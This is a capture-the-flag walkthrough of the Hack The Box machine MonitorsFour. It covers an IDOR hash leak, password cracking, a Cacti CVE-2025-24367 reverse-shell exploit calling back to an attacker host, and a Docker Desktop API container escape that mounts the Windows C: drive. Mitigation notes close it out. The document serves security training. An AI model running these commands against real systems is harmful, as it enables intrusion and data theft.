# MonitorsFour

![HTB](https://img.shields.io/badge/Hack%20The%20Box-Machine-9FEF00?style=flat&logo=hackthebox&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat)
![OS](https://img.shields.io/badge/OS-Windows-informational?style=flat&logo=windows&logoColor=white)
![Status](https://img.shields.io/badge/Status-Pwned-9FEF00?style=flat)

---

## Overview

| Field | Details |
|---|---|
| Machine Name | MonitorsFour |
| Difficulty | Easy |
| Operating System | Windows (Docker Desktop on WSL2 — Linux containers exposed) |
| IP Address | 10.129.5.164 |

---

## Summary

> MonitorsFour is an Easy Windows machine from HackTheBox Season 10 (Season of the Gacha), created by TheCyberGeek and kavigihan. The attack starts with an IDOR vulnerability on the main site's unauthenticated `/api/v1/user` endpoint, which leaks all user records including MD5-hashed passwords. Cracking the admin hash with CrackStation yields credentials for Cacti, which runs version 1.2.28 — vulnerable to CVE-2025-24367 (Authenticated RCE). The exploit delivers a reverse shell as `www-data` inside a Linux Docker container. From there, a subnet sweep reveals the Docker Engine API exposed on `192.168.65.7:2375` without authentication — CVE-2025-9074 (CVSS 9.3). By crafting a malicious container that mounts the Windows host's C: drive, the root flag is read directly from the Administrator's Desktop.

> **Note:** Nmap fingerprints the host as Windows Server (correct — it runs Docker Desktop on WSL2). The reverse shell lands inside a Linux container, which can be confusing. The actual host OS is Windows.

---

## 1. Reconnaissance

### Nmap Scan

```bash
# Full service/script scan
nmap -sCV -A 10.129.5.164 -oN nmap/initial.txt
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
| http-cookie-flags:
|   /: 
|     PHPSESSID:
|_      httponly flag not set
|_http-title: MonitorsFour - Networking Solutions
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Open Ports

| Port | Protocol | Service | Version / Notes |
|---|---|---|---|
| 80 | TCP | HTTP | nginx — redirects to `monitorsfour.htb` — PHP 8.3.27 backend |
| 5985 | TCP | WinRM | Microsoft HTTPAPI 2.0 — Windows Remote Management |

### Notes

> Only two TCP ports. Port 80 redirects to `monitorsfour.htb` (add to `/etc/hosts`). The `PHPSESSID` cookie without `HttpOnly` flag hints at a PHP application behind Nginx. Port 5985 (WinRM) confirms a Windows host — useful if Windows credentials are found. Virtual host and API enumeration are the logical next steps.

---

## 2. Enumeration

### Web Enumeration

```bash
# Add virtual host to /etc/hosts
echo "10.129.5.164    monitorsfour.htb" | sudo tee -a /etc/hosts

# Subdomain / VHost fuzzing
ffuf -u http://monitorsfour.htb \
     -H "Host: FUZZ.monitorsfour.htb" \
     -ac \
     -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# Result: cacti.monitorsfour.htb  [Status: 302]

# Add Cacti subdomain to /etc/hosts
echo "10.129.5.164    cacti.monitorsfour.htb" | sudo tee -a /etc/hosts

# API endpoint discovery on the main site
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u http://monitorsfour.htb/FUZZ -ac
# Results:
# api/v1/auth   [Status: 405]
# api/v1/user   [Status: 200, Size: 35]
```

> `http://monitorsfour.htb/api/v1/user` returns `{"error":"Missing token parameter"}`. Testing with `token=0` triggers full data disclosure — the endpoint performs no authorization check, returning all user records.

---

### Vulnerability Identified: IDOR on `/api/v1/user`

> The `/api/v1/user` endpoint accepts a `token` parameter but does not validate ownership or enforce authentication. Passing any token value (e.g. `0`) returns the complete user table, including usernames, email addresses, MD5 password hashes, salary data, and per-user API tokens.

```bash
# Dump all user records
curl -s "http://monitorsfour.htb/user?token=0"
```

```json
[
  {"id":2,"username":"admin","email":"admin@monitorsfour.htb",
   "password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user",
   "token":"8024b78f83f102da4f","name":"Marcus Higgins",
   "position":"System Administrator","salary":"320800.00"},
  {"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb",
   "password":"69196959c16b26ef00b77d82cf6eb169","role":"user"},
  {"id":6,"username":"janderson","email":"janderson@monitorsfour.htb",
   "password":"2a22dcf99190c322d974c8df5ba3256b","role":"user"},
  {"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb",
   "password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user"}
]
```

> The admin account belongs to **Marcus Higgins** (`admin@monitorsfour.htb`). Cacti uses the first name as the login username — not `admin`.

```bash
# Crack the admin MD5 hash with CrackStation (online) or hashcat locally
# Hash: 56b32eb43e6f15395f6c46c1c9e1cd36
# Result: wonderful1

# Hashcat equivalent:
echo "56b32eb43e6f15395f6c46c1c9e1cd36" > hashes.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

> Credentials: `marcus : wonderful1`

---

### Cacti Subdomain

> `http://cacti.monitorsfour.htb` — Cacti network monitoring app. The page footer reveals: **Version 1.2.28**. Server confirmed as nginx.

---

## 3. Foothold

### Vulnerability Identified

> **CVE-2025-24367 — Cacti 1.2.28 Authenticated Remote Code Execution (CVSS 8.8)**  
> Cacti ≤ 1.2.28 contains an authenticated RCE vulnerability in the Graph Templates functionality. An attacker with valid credentials can inject PHP code via the template import/creation workflow, causing Cacti to write and execute a malicious PHP file in the web root. This results in arbitrary OS command execution as the web server user (`www-data`).

### Exploitation

```bash
# Clone the PoC
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
cd CVE-2025-24367-Cacti-PoC

# Set up Python venv and install dependencies
python3 -m venv venv && source venv/bin/activate
pip install requests beautifulsoup4

# Start a listener in a separate terminal
nc -lvnp 4444

# Run the exploit (requires sudo for port 80 HTTP server)
sudo python3 exploit.py \
    -url http://cacti.monitorsfour.htb \
    -u marcus \
    -p wonderful1 \
    -i <attacker-ip> \
    -l 4444
```

```
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: IV02F.php
[+] Got payload: /bash
[i] Created PHP filename: xOneM.php
[+] Hit timeout, looks good for shell, check your listener!
```

> The exploit authenticates to Cacti, abuses the Graph Templates import to write a PHP webshell, then triggers execution to deliver a reverse shell.

### Shell Obtained

> Reverse shell received as `www-data` inside a **Linux Docker container** (hostname: `821fbd6a43fa`). This is a Cacti container, not the Windows host directly.

```bash
www-data@821fbd6a43fa:~/html/cacti$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> The user flag is accessible at `/home/marcus/user.txt` (readable from within the container):

```bash
www-data@821fbd6a43fa:/home/marcus$ cat user.txt
<user flag here>
```

---

## 4. Lateral Movement / Container Escape

### Step 1 — Internal Network Sweep

> From inside the container, probe the Docker internal subnet (`192.168.65.0/24`) for the Docker Engine API on port 2375:

```bash
for i in $(seq 1 254); do
  curl -s --connect-timeout 1 http://192.168.65.$i:2375/version | grep -q "ApiVersion" && \
  echo "192.168.65.$i:2375 OPEN"
done
# Result: 192.168.65.7:2375 OPEN
```

```bash
# Confirm Docker Engine API is accessible
curl http://192.168.65.7:2375/version
# Returns: Docker Engine 28.3.2, ApiVersion 1.51, KernelVersion 6.6.87.2-microsoft-standard-WSL2
```

> The WSL2 kernel string confirms this is **Docker Desktop on Windows**. The Docker Engine API is exposed without authentication.

### Step 2 — Vulnerability Identified: CVE-2025-9074

> **CVE-2025-9074 — Docker Desktop Unauthenticated Docker Engine API Access (CVSS 9.3 / Critical)**  
> Docker Desktop versions < 4.44.3 on Windows and macOS expose the Docker Engine API at `http://192.168.65.7:2375` without authentication, accessible from any running container. This occurs regardless of whether Enhanced Container Isolation (ECI) or the "Expose daemon on tcp://localhost:2375 without TLS" option is enabled. Any container can use this API to create new privileged containers, mount host volumes, and achieve full host compromise. On Windows (WSL2 backend), mounting the C: drive grants full read/write access to the Windows filesystem with the privileges of the Docker Desktop user.

### Step 3 — Exploitation: Create a Malicious Container

```bash
# On attacker machine — create malicious container config and serve it
cat > container.json << 'EOF'
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
EOF
cd /tmp && python3 -m http.server 8000

# On the compromised container — download the config
curl http://<attacker-ip>:8000/container.json -o /tmp/container.json

# Create the container via the unauthenticated Docker API
curl -X POST \
     -H "Content-Type: application/json" \
     -d @/tmp/container.json \
     "http://192.168.65.7:2375/containers/create?name=pwned1"
# Returns container ID

# Start the container
curl -X POST "http://192.168.65.7:2375/containers/<CONTAINER_ID>/start"

# Retrieve output (root flag)
curl "http://192.168.65.7:2375/containers/<CONTAINER_ID>/logs?stdout=true"
```

> The container starts with the Windows C: drive mounted at `/mnt/host_root`. The `cat` command reads the Administrator's root flag directly from the Windows filesystem, returned in the logs response.

### Alternative — Interactive Shell on Host

```bash
# Instead of cat, get a reverse shell from the privileged container
# Modify container.json Cmd to:
# ["/bin/sh", "-c", "cp /mnt/host_root/Users/Administrator/.ssh/authorized_keys /tmp/ && ..."]
# Or: write a new authorized_keys / add a user / drop a webshell on the Windows host
```

---

## 5. Privilege Escalation

> Not a traditional local privesc — the container escape via CVE-2025-9074 directly mounts the Windows host filesystem with Docker Desktop user (Administrator-level) privileges. The root flag is accessible without further escalation steps.

### Root / Administrator Access

> Root flag retrieved via Docker API container logs:

```bash
curl "http://192.168.65.7:2375/containers/<CONTAINER_ID>/logs?stdout=true"
# <root flag here>
```

---

## 6. Flags

| Flag | Value |
|---|---|
| User | (retrieve via `cat /home/marcus/user.txt` inside container) |
| Root | (retrieve via Docker API container logs — `cat /mnt/host_root/Users/Administrator/Desktop/root.txt`) |

---

## 7. Lessons Learned

> - **Unauthenticated APIs are critical regardless of perceived network location** — the Docker Engine API at `192.168.65.7:2375` was "internal" but directly reachable from any container. Internal does not mean secure. Zero-trust principles apply everywhere.
> - **IDOR on API endpoints with token=0** — always test numeric token/ID values, especially near `0` or `1`. The `/api/v1/user` endpoint required no real authentication and returned the full database, including password hashes.
> - **MD5 hashes remain trivially crackable** — `wonderful1` cracked in seconds via CrackStation. Password hashing in 2025 should use bcrypt, Argon2, or scrypt — never MD5/SHA1.
> - **Container hostname ≠ host OS** — the shell landed inside a Linux container (`821fbd6a43fa`) despite the underlying host being Windows. Always check the kernel string and environment for Docker/container indicators before assuming you've landed on the actual host.
> - **CVE-2025-9074** demonstrates that Docker Desktop's WSL2 network model introduces dangerous trust assumptions. The internal subnet is not isolated from containers, and the Docker Engine API should never be exposed without TLS and authentication.
> - **Subnet sweeps are essential post-foothold** — the Docker API on `192.168.65.7` would have been entirely invisible from external enumeration. Pivoting enumeration to internal subnets from a foothold is a critical lateral movement step.
> - **The exploit author is the machine creator** — CVE-2025-24367 PoC was written by TheCyberGeek, who also created MonitorsFour. This is intentional: the machine is a showcase for a real CVE they discovered and disclosed.

---

## 8. Mitigation & Hardening

> - **CVE-2025-24367 (Cacti RCE)**: Upgrade Cacti to a patched version (post-1.2.28). Apply strict input validation and output encoding for the Graph Templates import functionality. Restrict Cacti access to trusted IP ranges and enforce strong, unique credentials.
> - **IDOR on `/api/v1/user`**: Implement proper server-side authorization on all API endpoints. Every request must validate that the authenticated user has permission to access the requested resource. Reject or ignore unauthenticated or zero-value tokens. Never return full database records (especially password hashes or salary data) to unauthenticated users.
> - **MD5 password hashing**: Replace MD5 with a modern, properly salted KDF — bcrypt (cost ≥ 12), Argon2id, or scrypt. Rotate all existing credentials and force password resets.
> - **CVE-2025-9074 (Docker Desktop API exposure)**: Upgrade Docker Desktop to version 4.44.3 or later immediately. Review whether Docker Desktop is appropriate for production or server workloads — it is intended for local development only. Apply network policies to block container-to-host API traffic on the internal bridge subnet. Enable TLS on the Docker daemon if TCP exposure is required.
> - **WinRM exposure (port 5985)**: If WinRM must be exposed, restrict access to specific management IP ranges via firewall rules. Enforce multi-factor authentication and use HTTPS (WinRM over TLS, port 5986) exclusively.
> - **Credential hygiene**: Passwords like `wonderful1` are in every major wordlist. Enforce a minimum password policy with complexity requirements and check new passwords against known breached password databases (e.g., HaveIBeenPwned API).

---

## References

- [CVE-2025-24367 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-24367)
- [CVE-2025-24367 — PoC by TheCyberGeek (GitHub)](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)
- [CVE-2025-24367 — Medium writeup](https://medium.com/@929319519qq/cve-2025-24367-exploit-no-code-59aff124d547)
- [CVE-2025-9074 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-9074)
- [CVE-2025-9074 — Docker Desktop Container Escape PoC (GitHub)](https://github.com/PtechAmanja/CVE-2025-9074-Docker-Desktop-Container-Escape)
- [CVE-2025-9074 — Docker official advisory + 4.44.3 release notes](https://docs.docker.com/desktop/release-notes/#4443)
- [CVE-2025-9074 — SOCRadar Analysis](https://socradar.io/blog/cve-2025-9074-docker-desktop-host-compromise/)
- [Docker Engine API Reference](https://docs.docker.com/engine/api/latest/)
- [OWASP — IDOR (Insecure Direct Object Reference)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
